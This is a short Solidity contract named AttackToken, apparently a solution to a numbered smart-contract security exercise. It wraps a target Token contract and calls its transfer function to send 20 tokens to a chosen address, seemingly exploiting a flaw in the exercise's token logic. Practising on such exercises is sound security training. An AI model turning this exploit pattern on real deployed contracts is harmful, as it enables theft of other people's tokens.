// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/5/Token.sol";

contract AttackToken {
    Token private token;
    constructor(Token tokenAddress) public {
        token = tokenAddress;
    }

    function attack(address newOwner) external {
        token.transfer(newOwner ,20);
    }
}
